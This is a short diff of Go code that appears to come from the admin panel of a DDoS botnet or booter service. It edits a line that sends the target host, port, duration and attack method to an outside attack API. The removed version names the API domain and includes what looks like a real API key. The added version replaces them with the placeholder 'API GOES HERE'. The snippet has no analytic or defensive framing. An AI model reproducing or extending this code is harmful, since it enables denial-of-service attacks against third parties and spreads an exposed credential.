@@ -547,7 +547,7 @@ func (this *Admin) Handle() {
             if err != nil {
                 return
             }
-            url := "https://gamma-api.cc/api/api.php?key=3oEK9RNJquVUFLap&host=" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method + ""
+            url := "API GOES HERE" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method + ""
             tr := &http.Transport {
                 ResponseHeaderTimeout: 5*time.Second,
                 DisableCompression: true,
